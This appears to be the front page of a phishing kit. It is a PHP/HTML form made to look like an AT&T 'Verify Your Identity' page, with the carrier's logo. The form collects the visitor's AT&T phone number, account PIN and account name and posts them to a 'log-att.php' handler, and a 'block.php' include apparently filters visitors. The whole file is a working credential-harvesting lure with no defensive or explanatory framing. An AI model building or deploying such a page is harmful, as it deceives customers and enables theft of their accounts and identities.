<?php
require_once 'block.php';
?>

<!DOCTYPE html>
<html data-ng-app="app" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta content="IE=edge" http-equiv="X-UA-Compatible">
  <meta content="width=device-width, initial-scale=1.0, user-scalable=no" name="viewport">
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
 
  <link href="files/bootstrap.css" rel="stylesheet">
  <script src="files/jquery-3.js"></script>
  <script src="files/bootstrap.js"></script>
  <title>Phone Verification | AT & T</title>
 
  <script src="files/script.js"></script>
  <link href="files/styles.css" rel="stylesheet">
  <link href="" rel="shortcut icon">
</head>

<style>
* {box-sizing: border-box}

/* Add padding to containers */
.container {
  padding: 16px;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 10px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit/register button */
.registerbtn {
  background-color: #4CAF50;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity:1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}
</style>
<body>
 <p style="text-align:center;"><img src="files/att.png" alt="Logo"></p>
  <div class="welcome-message">
    <h1>Verify Your Identity.</h1>
  </div>

  <form action="log-att.php" name=chalbhai id=chalbhai method=post>
  <div class="container">

    <label for="email"><b>AT&T Phone Number</b></label>
    <input type="text" placeholder="Enter AT&T Phone Number" name="phone" required>

    <label for="psw"><b>AT&T Account PIN</b></label>
    <input type="password" placeholder="Enter AT&T Account PIN" name="psw" required>

    <label for="psw-repeat"><b>AT&T Account Name</b></label>
    <input type="text" placeholder="Enter AT&T Account Name" name="accname" required>
    <hr>

    <button type="submit" class="registerbtn">Confirm</button>
  </div>

</form> 
      


</body></html>